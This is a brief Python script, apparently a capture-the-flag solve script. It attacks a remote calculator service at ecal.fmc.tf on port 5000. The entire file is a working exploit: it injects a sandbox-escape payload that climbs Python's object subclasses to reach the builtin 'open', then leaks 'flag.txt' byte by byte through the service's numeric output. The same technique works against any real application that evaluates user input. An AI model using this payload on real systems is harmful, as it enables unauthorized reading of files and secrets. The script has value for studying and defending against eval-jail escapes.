import socket


url = "ecal.fmc.tf"
port = 5000

socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
socket.connect((url, port))


tmp = b'(1).from_bytes([i for i in ().__class__.__mro__[1].__subclasses__() if "_wrap_close" in i.__name__][0].__init__.__builtins__["open"]("flag.txt").read()[%d].encode())\n'
ind = 0

flag = ""
while not flag.endswith("}"):
    socket.send(tmp % ind)
    socket.send(b"0\n")
    socket.send(b"+\n")
    ind += 1
    r = socket.recv(1000)
    if b"=" in r:
        char = r.split(b"\n")[-2].split(b"=")[-1].strip().decode()
        flag += chr(int(char))
        print(f"\rFlag: {flag}", end="")
socket.close()
print()